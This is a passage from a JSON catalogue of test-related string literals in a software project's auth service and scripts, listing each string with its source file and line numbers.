      "value": "Testing missing parameters...",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:42"
      ]
    },
    "Testing missing token...": {
      "value": "Testing missing token...",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:54"
      ]
    },
    "Testing modular DataSubAgent...": {
      "value": "Testing modular DataSubAgent...",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:88"
      ]
    },
    "Testing normal deployment scenario...": {
      "value": "Testing normal deployment scenario...",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:163"
      ]
    },
    "Testing port allocation coordination": {
      "value": "Testing port allocation coordination",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:158"
      ]
    },
    "Testing pre-run size validation...": {
      "value": "Testing pre-run size validation...",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:121"
      ]
    },
    "Testing readiness vs health check separation": {
      "value": "Testing readiness vs health check separation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:123"
      ]
    },
    "Testing resource cleanup": {
      "value": "Testing resource cleanup",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:351"
      ]
    },
    "Testing secret access...": {
      "value": "Testing secret access...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:138"
      ]
    },
    "Testing service discovery timing fixes": {
      "value": "Testing service discovery timing fixes",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:187"
      ]
    },
    "Testing service initialization order...": {
      "value": "Testing service initialization order...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:35"
      ]
    },
    "Testing startup timing...": {
      "value": "Testing startup timing...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:196"
      ]
    },
    "Testing valid URL:": {
      "value": "Testing valid URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:177"
      ]
    },
    "Tests - Split from": {
      "value": "Tests - Split from",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:381",
        "scripts/auto_fix_test_sizes.py:386",
        "scripts/compliance/test_fixer.py:205"
      ]
    },
    "Tests Executed:": {
      "value": "Tests Executed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:334"
      ]
    },
    "Tests Failed:": {
      "value": "Tests Failed:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:132"
      ]
    },
    "Tests Passed:": {
      "value": "Tests Passed:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:122",
        "scripts/batch_fix_and_test.py:131",
        "scripts/test_backend_optimized.py:335"
      ]
    },
    "Tests completed!": {
      "value": "Tests completed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:209"
      ]
    },
    "Tests in excluded directories:": {
      "value": "Tests in excluded directories:",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:35"
      ]
    },
    "Tests marked as consistently failing": {
      "value": "Tests marked as consistently failing",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:112"
      ]
    },
    "Tests needing implementation:": {
      "value": "Tests needing implementation:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:389"
      ]
    },
    "Tests passed:": {
      "value": "Tests passed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:92"
      ]
    },
    "Tests requiring real database connections": {
      "value": "Tests requiring real database connections",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:92"
      ]
    },
    "Tests requiring real external services": {
      "value": "Tests requiring real external services",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:90"
      ]
    },
    "Tests that all Five Whys fixes work together in staging environment.": {
      "value": "Tests that all Five Whys fixes work together in staging environment.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:268"
      ]
    },
    "Tests that may fail intermittently": {
      "value": "Tests that may fail intermittently",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:111"
      ]
    },
    "Tests that use real LLM services": {
      "value": "Tests that use real LLM services",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:91"
      ]
    },
    "Tests timed out after": {
      "value": "Tests timed out after",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:477"
      ]
    },
    "Tests using only mocks": {
      "value": "Tests using only mocks",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:93"
      ]
    },
    "The Auth service database connection issue is likely caused by:": {
      "value": "The Auth service database connection issue is likely caused by:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:174"
      ]
    },
    "The Auth service should be able to connect to staging database": {
      "value": "The Auth service should be able to connect to staging database",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:320"
      ]
    },
    "The current configuration shows potential for improvement in the following areas:": {
      "value": "The current configuration shows potential for improvement in the following areas:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:159"
      ]
    },
    "The issue is likely with the actual database connection in Cloud Run": {
      "value": "The issue is likely with the actual database connection in Cloud Run",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:241"
      ]
    },
    "The service coordination system should now handle:": {
      "value": "The service coordination system should now handle:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:415"
      ]
    },
    "The system analysis reveals the following insights:": {
      "value": "The system analysis reveals the following insights:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:161"
      ]
    },
    "These files exceed 450-line limit and should be split:": {
      "value": "These files exceed 450-line limit and should be split:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:201"
      ]
    },
    "These files should be fixed manually before attempting any refactoring.": {
      "value": "These files should be fixed manually before attempting any refactoring.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:724"
      ]
    },
    "These files will be skipped to avoid overwrites.": {
      "value": "These files will be skipped to avoid overwrites.",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:244"
      ]
    },
    "These functions exceed 25-line limit and need helper extraction:": {
      "value": "These functions exceed 25-line limit and need helper extraction:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:208"
      ]
    },
    "These integration tests use excessive mocking:": {
      "value": "These integration tests use excessive mocking:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:217"
      ]
    },
    "These test pairs appear to be exact duplicates and should be consolidated:": {
      "value": "These test pairs appear to be exact duplicates and should be consolidated:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:586"
      ]
    },
    "These test pairs are highly similar and might benefit from refactoring:": {
      "value": "These test pairs are highly similar and might benefit from refactoring:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:601"
      ]
    },
    "This demo shows Fix #2: Test Size Limits Enforcement implementation": {
      "value": "This demo shows Fix #2: Test Size Limits Enforcement implementation",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:203"
      ]
    },
    "This might be expected if not running on GCP or without proxy": {
      "value": "This might be expected if not running on GCP or without proxy",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:246"
      ]
    },
    "This report identifies test files that violate size constraints.": {
      "value": "This report identifies test files that violate size constraints.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:857"
      ]
    },
    "This should work if running on GCP or with Cloud SQL proxy": {
      "value": "This should work if running on GCP or with Cloud SQL proxy",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:237"
      ]
    },
    "This validates fixes for issues in test_critical_cold_start_initialization.py": {
      "value": "This validates fixes for issues in test_critical_cold_start_initialization.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:406"
      ]
    },
    "This would contain:\n- All user creation tests\n- All authentication tests  \n- All permission tests\n- All user profile tests\n- Helper functions": {
      "value": "This would contain:\n- All user creation tests\n- All authentication tests  \n- All permission tests\n- All user profile tests\n- Helper functions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:67"
      ]
    },
    "This would require careful AST manipulation": {
      "value": "This would require careful AST manipulation",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:597"
      ]
    },
    "Timeout": {
      "value": "Timeout",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:60"
      ]
    },
    "Timeout '": {
      "value": "Timeout '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:378",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:380",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:384"
      ]
    },
    "Timeout during test": {
      "value": "Timeout during test",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:180"
      ]
    },
    "Timeout during validation": {
      "value": "Timeout during validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:137"
      ]
    },
    "Timeout in": {
      "value": "Timeout in",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:122"
      ]
    },
    "Timestamp:": {
      "value": "Timestamp:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:188"
      ]
    },
    "Timing difference too large:": {
      "value": "Timing difference too large:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:430",
        "auth_service/tests/unit/test_oauth_pkce_validation.py:87",
        "auth_service/tests/unit/test_oauth_state_security.py:88"
      ]
    },
    "To execute the renames, run: python": {
      "value": "To execute the renames, run: python",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:287"
      ]
    },
    "To fix import errors:": {
      "value": "To fix import errors:",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:108"
      ]
    },
    "To limit to first N files: python": {
      "value": "To limit to first N files: python",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:288"
      ]
    },
    "To restore: cp -r {backup_dir}/* {root_dir}/": {
      "value": "To restore: cp -r {backup_dir}/* {root_dir}/",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1013"
      ]
    },
    "To run all integration tests:": {
      "value": "To run all integration tests:",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:209"
      ]
    },
    "To run frontend tests with real services:": {
      "value": "To run frontend tests with real services:",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:207"
      ]
    },
    "To run real e2e tests:": {
      "value": "To run real e2e tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:83"
      ]
    },
    "Token": {
      "value": "Token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1064"
      ]
    },
    "Token (first 20 chars): [cyan]": {
      "value": "Token (first 20 chars): [cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:254"
      ]
    },
    "Token Blacklisting Basic Tests - Business Impact\n\nSecurity Foundation: Token Revocation and Access Control\n- Ensures proper token revocation for logout and security incidents\n- Validates blacklisting prevents continued access with revoked tokens\n- Critical foundation for account security and administrative controls\n\nTechnical Excellence:\n- Token revocation: individual tokens can be invalidated immediately\n- User blacklisting: all user tokens invalidated for account suspension\n- Persistence validation: blacklists survive service restarts (critical security requirement)\n- Malformed token handling: robust error handling prevents service disruption\n- Token rotation security: blacklisted refresh tokens cannot generate new access tokens\n- Concurrent safety: thread-safe blacklist operations for production scalability\n\nPlatform Security:\n- Foundation: Secure token revocation foundation for logout and security operations\n- Security: Comprehensive blacklist validation prevents access with revoked credentials\n- Persistence: Critical security requirement that blacklists survive system restarts\n- Reliability: Robust handling of edge cases and malformed inputs\n- Performance: Thread-safe operations ensure reliable blacklist checking under load": {
      "value": "Token Blacklisting Basic Tests - Business Impact\n\nSecurity Foundation: Token Revocation and Access Control\n- Ensures proper token revocation for logout and security incidents\n- Validates blacklisting prevents continued access with revoked tokens\n- Critical foundation for account security and administrative controls\n\nTechnical Excellence:\n- Token revocation: individual tokens can be invalidated immediately\n- User blacklisting: all user tokens invalidated for account suspension\n- Persistence validation: blacklists survive service restarts (critical security requirement)\n- Malformed token handling: robust error handling prevents service disruption\n- Token rotation security: blacklisted refresh tokens cannot generate new access tokens\n- Concurrent safety: thread-safe blacklist operations for production scalability\n\nPlatform Security:\n- Foundation: Secure token revocation foundation for logout and security operations\n- Security: Comprehensive blacklist validation prevents access with revoked credentials\n- Persistence: Critical security requirement that blacklists survive system restarts\n- Reliability: Robust handling of edge cases and malformed inputs\n- Performance: Thread-safe operations ensure reliable blacklist checking under load",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:262"
      ]
    },
    "Token Blacklisting Basic Tests - Core security functionality for token revocation\n\nTests the basic token blacklisting functionality that is critical for security,\nespecially for logout, account suspension, and security incidents.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Token Revocation\n- Ensures proper token revocation for logout and security incidents\n- Validates blacklisting prevents continued access with revoked tokens\n- Critical foundation for account security and administrative controls\n\nTest Coverage:\n- Token blacklisting on logout operations\n- User blacklisting for account suspension\n- Blacklist persistence across service restarts\n- Blacklist validation during token verification": {
      "value": "Token Blacklisting Basic Tests - Core security functionality for token revocation\n\nTests the basic token blacklisting functionality that is critical for security,\nespecially for logout, account suspension, and security incidents.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Token Revocation\n- Ensures proper token revocation for logout and security incidents\n- Validates blacklisting prevents continued access with revoked tokens\n- Critical foundation for account security and administrative controls\n\nTest Coverage:\n- Token blacklisting on logout operations\n- User blacklisting for account suspension\n- Blacklist persistence across service restarts\n- Blacklist validation during token verification",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:1"
      ]
    },
    "Token Endpoint": {
      "value": "Token Endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:129"
      ]
    },
    "Token Test Data Factory\nCreates JWT tokens and OAuth tokens for auth service testing.\nSupports access tokens, refresh tokens, and service tokens with proper claims.": {
      "value": "Token Test Data Factory\nCreates JWT tokens and OAuth tokens for auth service testing.\nSupports access tokens, refresh tokens, and service tokens with proper claims.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:1"
      ]
    },
    "Token Validation": {
      "value": "Token Validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:95",
        "scripts/test_auth_integration.py:101"
      ]
    },
    "Token exchange timeout": {
      "value": "Token exchange timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:320",
        "auth_service/tests/integration/test_auth_oauth_errors.py:321"
      ]
    },
    "Token failed for reason other than expiration:": {
      "value": "Token failed for reason other than expiration:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:69"
      ]
    },
    "Token generation took": {
      "value": "Token generation took",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:189"
      ]
    },
    "Token is expired:": {
      "value": "Token is expired:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:57"
      ]
    },
    "Token issued exactly 24 hours ago should be rejected": {
      "value": "Token issued exactly 24 hours ago should be rejected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:203"
      ]
    },
    "Token issued just under 24 hours ago should be accepted": {
      "value": "Token issued just under 24 hours ago should be accepted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:214"
      ]
    },
    "Token should be blacklisted": {
      "value": "Token should be blacklisted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:122"
      ]
    },
    "Token should be detected as blacklisted": {
      "value": "Token should be detected as blacklisted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:101"
      ]
    },
    "Token should be valid before blacklisting": {
      "value": "Token should be valid before blacklisting",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:50"
      ]
    },
    "Token should not be blacklisted initially": {
      "value": "Token should not be blacklisted initially",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:96"
      ]
    },
    "Token validation failed:": {
      "value": "Token validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:59"
      ]
    },
    "Token validation test failed:": {
      "value": "Token validation test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:100"
      ]
    },
    "TokenFactory": {
      "value": "TokenFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:17"
      ]
    },
    "TokenTestUtils": {
      "value": "TokenTestUtils",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/__init__.py:16"
      ]
    },
    "Too many requests": {
      "value": "Too many requests",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:195"
      ]
    },
    "ToolDispatcher(llm_manager)": {
      "value": "ToolDispatcher(llm_manager)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:321"
      ]
    },
    "ToolPermissionMiddleware does not default to staging": {
      "value": "ToolPermissionMiddleware does not default to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:84"
      ]
    },
    "Top splitting strategy:": {
      "value": "Top splitting strategy:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:96"
      ]
    },
    "Top violations by type:": {
      "value": "Top violations by type:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:132"
      ]
    },
    "Total Categories:": {
      "value": "Total Categories:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:274",
        "scripts/unified_test_runner.py:888",
        "scripts/unified_test_runner.py:899"
      ]
    },
    "Total Duration:": {
      "value": "Total Duration:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:329",
        "scripts/unified_test_runner.py:693"
      ]
    },
    "Total Fake Tests Found:": {
      "value": "Total Fake Tests Found:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:259"
      ]
    },
    "Total Files Scanned:": {
      "value": "Total Files Scanned:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:258"
      ]
    },
    "Total Iterations:": {
      "value": "Total Iterations:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:130"
      ]
    },
    "Total Test Files:": {
      "value": "Total Test Files:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:50"
      ]
    },
    "Total Test Violations:": {
      "value": "Total Test Violations:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:67"
      ]
    },
    "Total Tests Analyzed:": {
      "value": "Total Tests Analyzed:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:656"
      ]
    },
    "Total Tests:": {
      "value": "Total Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:737",
        "scripts/test_coordination_fixes.py:379",
        "scripts/test_example_message_flow.py:320",
        "scripts/test_staging_deployment.py:215",
        "scripts/test_staging_env.py:188",
        "scripts/test_verify_workflow_status_corrected.py:194",
        "scripts/test_websocket_dev_mode.py:295"
      ]
    },
    "Total Tracked Tests:": {
      "value": "Total Tracked Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:298"
      ]
    },
    "Total Violations:": {
      "value": "Total Violations:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:310"
      ]
    },
    "Total conftest.py files:": {
      "value": "Total conftest.py files:",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:102"
      ]
    },
    "Total errors:": {
      "value": "Total errors:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:219"
      ]
    },
    "Total failures found:": {
      "value": "Total failures found:",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:225"
      ]
    },
    "Total files processed:": {
      "value": "Total files processed:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:282"
      ]
    },
    "Total files scanned:": {
      "value": "Total files scanned:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:309"
      ]
    },
    "Total fixes applied:": {
      "value": "Total fixes applied:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:141"
      ]
    },
    "Total iterations:": {
      "value": "Total iterations:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:140",
        "scripts/iterative_test_fix_loop.py:164"
      ]
    },
    "Total lines:": {
      "value": "Total lines:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:34",
        "scripts/compliance/demo_test_size_enforcement.py:152",
        "scripts/compliance/test_refactor_helper.py:706"
      ]
    },
    "Total mocks found:": {
      "value": "Total mocks found:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:167"
      ]
    },
    "Total test files scanned:": {
      "value": "Total test files scanned:",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:160",
        "scripts/compliance/test_size_validator.py:420"
      ]
    },
    "Total test files:": {
      "value": "Total test files:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:287"
      ]
    },
    "Total tests processed:": {
      "value": "Total tests processed:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:391"
      ]
    },
    "Total tests scanned:": {
      "value": "Total tests scanned:",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:34",
        "scripts/test_failure_scanner.py:224"
      ]
    },
    "Total validation time:": {
      "value": "Total validation time:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:216"
      ]
    },
    "Total violations:": {
      "value": "Total violations:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:423"
      ]
    },
    "Total workflows:": {
      "value": "Total workflows:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:333"
      ]
    },
    "Total:": {
      "value": "Total:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:380",
        "scripts/test_auth_database_sessions.py:396",
        "scripts/test_auth_integration.py:156",
        "scripts/test_database_url_builder_comprehensive.py:347",
        "scripts/test_ssl_certificates_staging.py:304",
        "scripts/test_staging_migrations.py:324",
        "scripts/test_staging_startup.py:271"
      ]
    },
    "Tuple[": {
      "value": "Tuple[",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:228"
      ]
    },
    "Type:": {
      "value": "Type:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:180",
        "scripts/compliance/test_size_validator.py:441",
        "scripts/remove_test_stubs.py:330"
      ]
    },
    "UNIFIED TEST CONFIGURATION\n==========================\nCentral configuration for all testing operations across Netra platform.\nThis module defines test levels, markers, environments, and execution strategies.": {
      "value": "UNIFIED TEST CONFIGURATION\n==========================\nCentral configuration for all testing operations across Netra platform.\nThis module defines test levels, markers, environments, and execution strategies.",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:1"
      ]
    },
    "UNION": {
      "value": "UNION",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:615"
      ]
    },
    "URGENT: Add tests for": {
      "value": "URGENT: Add tests for",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:252"
      ]
    },
    "URL Construction": {
      "value": "URL Construction",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:219"
      ]
    },
    "URL Driver Compatibility": {
      "value": "URL Driver Compatibility",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:265"
      ]
    },
    "URL Generation with Actual Credentials": {
      "value": "URL Generation with Actual Credentials",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:153"
      ]
    },
    "URL compatibility issues:": {
      "value": "URL compatibility issues:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:254"
      ]
    },
    "URL construction test failed:": {
      "value": "URL construction test failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:121"
      ]
    },
    "URL format mismatch. Expected:": {
      "value": "URL format mismatch. Expected:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:325"
      ]
    },
    "URL format mismatches:": {
      "value": "URL format mismatches:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:321"
      ]
    },
    "URL format validation failed:": {
      "value": "URL format validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:236"
      ]
    },
    "URL missing asyncpg driver specification": {
      "value": "URL missing asyncpg driver specification",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:251"
      ]
    },
    "URL must contain correct Cloud SQL connection name": {
      "value": "URL must contain correct Cloud SQL connection name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:245"
      ]
    },
    "URL:": {
      "value": "URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:115",
        "scripts/test_staging_db_direct.py:102"
      ]
    },
    "USE_DOCKER_SERVICES": {
      "value": "USE_DOCKER_SERVICES",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:559",
        "scripts/unified_test_runner.py:565"
      ]
    },
    "USE_MOCKS": {
      "value": "USE_MOCKS",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:303"
      ]
    },
    "USE_REAL_LLM": {
      "value": "USE_REAL_LLM",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:561",
        "scripts/unified_test_runner.py:566"
      ]
    },
    "USE_REAL_SERVICES": {
      "value": "USE_REAL_SERVICES",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:152",
        "scripts/test_staging.py:34",
        "scripts/unified_test_runner.py:182",
        "scripts/unified_test_runner.py:557",
        "scripts/unified_test_runner.py:564"
      ]
    },
    "USE_TEST_DATABASE": {
      "value": "USE_TEST_DATABASE",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:616",
        "scripts/unified_test_runner.py:619"
      ]
    },
    "UTF-8": {
      "value": "UTF-8",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:21",
        "scripts/test_ssl_certificates_staging.py:22",
        "scripts/test_staging_db_direct.py:24",
        "scripts/test_staging_migrations.py:21"
      ]
    },
    "Unauthorized client": {
      "value": "Unauthorized client",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:179"
      ]
    },
    "Unexpected error during testing:": {
      "value": "Unexpected error during testing:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:348"
      ]
    },
    "Unexpected error for missing GOOGLE_CLIENT_ID:": {
      "value": "Unexpected error for missing GOOGLE_CLIENT_ID:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:119"
      ]
    },
    "Unexpected error for missing GOOGLE_CLIENT_SECRET:": {
      "value": "Unexpected error for missing GOOGLE_CLIENT_SECRET:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:159"
      ]
    },
    "Unexpected error from AuthSecretLoader.": {
      "value": "Unexpected error from AuthSecretLoader.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:418"
      ]
    },
    "Unexpected error:": {
      "value": "Unexpected error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:130"
      ]
    },
    "Unexpected exception from AuthSecretLoader.": {
      "value": "Unexpected exception from AuthSecretLoader.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:420"
      ]
    },
    "Unexpected status code:": {
      "value": "Unexpected status code:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:156"
      ]
    },
    "Unexpected status:": {
      "value": "Unexpected status:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:69"
      ]
    },
    "Unified JWT Validation Tests Package\n\nBusiness Value: Authentication security for cross-service communication": {
      "value": "Unified JWT Validation Tests Package\n\nBusiness Value: Authentication security for cross-service communication",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/__init__.py:1"
      ]
    },
    "Unified Test Runner for Netra Apex Platform": {
      "value": "Unified Test Runner for Netra Apex Platform",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:711"
      ]
    },
    "Unit Tests": {
      "value": "Unit Tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:46"
      ]
    },
    "Unit tests for OAuth models and validation\nTests Pydantic models used in OAuth flows": {
      "value": "Unit tests for OAuth models and validation\nTests Pydantic models used in OAuth flows",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:1"
      ]
    },
    "Unit tests for isolated components": {
      "value": "Unit tests for isolated components",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:75"
      ]
    },
    "Unix socket path doesn't exist in Cloud Run environment": {
